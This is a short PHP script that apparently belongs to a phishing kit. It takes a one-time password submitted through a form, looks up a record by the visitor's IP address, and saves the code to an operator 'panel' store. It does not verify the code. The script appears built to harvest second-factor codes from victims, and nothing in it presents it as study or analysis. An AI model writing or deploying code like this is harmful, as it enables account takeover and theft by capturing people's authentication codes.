<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$otp = $ifilter->process($_POST['otp']);

$ip = $_SERVER['REMOTE_ADDR'];
$registro = get_id($ip);
put_otp($registro,$otp);
?>